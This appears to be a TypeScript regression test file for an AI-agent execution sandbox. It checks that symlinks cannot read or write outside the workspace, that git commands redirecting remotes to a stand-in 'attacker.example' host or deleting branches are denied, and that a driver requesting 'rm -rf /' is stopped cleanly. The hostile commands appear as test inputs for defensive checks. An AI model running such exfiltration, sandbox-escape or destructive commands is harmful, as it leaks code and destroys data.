/**
 * Regression tests for the M1b execution-safety review (run wd5gzyvh9).
 * HIGH: symlink read/write escape. MED: coarse git allowlist. LOW: driver
 * generator finally not running on early break.
 */
import assert from "node:assert/strict";
import { test } from "node:test";
import { existsSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  GovernedSession,
  WorkspaceExecutor,
  reefAllowlist,
  type Driver,
  type DriverStep,
} from "../src/index.js";

function clock(): () => string {
  let n = 0;
  return () => new Date(Date.UTC(2026, 6, 7, 0, 0, n++)).toISOString();
}

// ---- HIGH: symlinks can't escape the workspace (read OR write) ----
test("M1b review HIGH: a symlink in the workspace cannot read or write outside it", async () => {
  const ws = mkdtempSync(join(tmpdir(), "reef-ws-"));
  const outside = mkdtempSync(join(tmpdir(), "reef-out-"));
  writeFileSync(join(outside, "secret.txt"), "OUTSIDE-SECRET");
  symlinkSync(join(outside, "secret.txt"), join(ws, "link")); // file symlink → outside
  symlinkSync(outside, join(ws, "dir")); // directory symlink → outside

  const ex = new WorkspaceExecutor(ws);

  const readLink = await ex.execute({
    type: "read",
    summary: "",
    target: "link",
  });
  assert.equal(readLink.ok, false);
  assert.match(readLink.error ?? "", /symlink/);

  const readViaDir = await ex.execute({
    type: "read",
    summary: "",
    target: "dir/secret.txt",
  });
  assert.equal(readViaDir.ok, false);
  assert.match(readViaDir.error ?? "", /symlink/);

  const writeViaDir = await ex.execute({
    type: "edit",
    summary: "",
    target: "dir/planted.txt",
    payload: { content: "PWNED" },
  });
  assert.equal(writeViaDir.ok, false);
  assert.equal(
    existsSync(join(outside, "planted.txt")),
    false,
    "nothing was written outside the workspace",
  );

  // legit in-root read/write still works
  const write = await ex.execute({
    type: "edit",
    summary: "",
    target: "sub/note.txt",
    payload: { content: "ok" },
  });
  assert.equal(write.ok, true);
  const read = await ex.execute({
    type: "read",
    summary: "",
    target: "sub/note.txt",
  });
  assert.equal(read.output, "ok");
});

// ---- MED: git allowlist only permits always-read-only subcommands ----
test("M1b review MED: write/destructive git subcommands are not on the allowlist", () => {
  const a = reefAllowlist();
  const P = { id: "x", roles: [] as readonly string[], source: "t" };
  const cmd = (id: string): boolean =>
    a.can(P, "reef.action.command", { type: "command", id }) as boolean;

  assert.equal(cmd("git remote add exfil https://attacker.example/r"), false);
  assert.equal(
    cmd("git remote set-url origin https://attacker.example/r"),
    false,
  );
  assert.equal(cmd("git branch -D main"), false);
  assert.equal(cmd("git status"), true);
  assert.equal(cmd("git log --oneline"), true);
  assert.equal(cmd("git diff HEAD"), true);
});

// ---- LOW: the driver generator's finally runs on early break ----
test("M1b review LOW: a driver's try/finally runs when the session breaks early", async () => {
  let cleanedUp = false;
  const driver: Driver = {
    name: "cleanup",
    async *run(): AsyncIterable<DriverStep> {
      try {
        // A denied REQUIRED action makes the session break out of the loop.
        yield {
          type: "action",
          action: {
            type: "command",
            summary: "wipe",
            payload: { command: "rm -rf /" },
            required: true,
          },
        };
        yield { type: "done", summary: "unreachable" };
      } finally {
        cleanedUp = true;
      }
    },
  };
  const session = new GovernedSession({
    id: "cl",
    task: "cleanup",
    driver,
    now: clock(),
  });
  const { outcome } = await session.run();

  assert.equal(outcome, "failed");
  assert.equal(
    cleanedUp,
    true,
    "the driver's finally block ran via it.return()",
  );
});
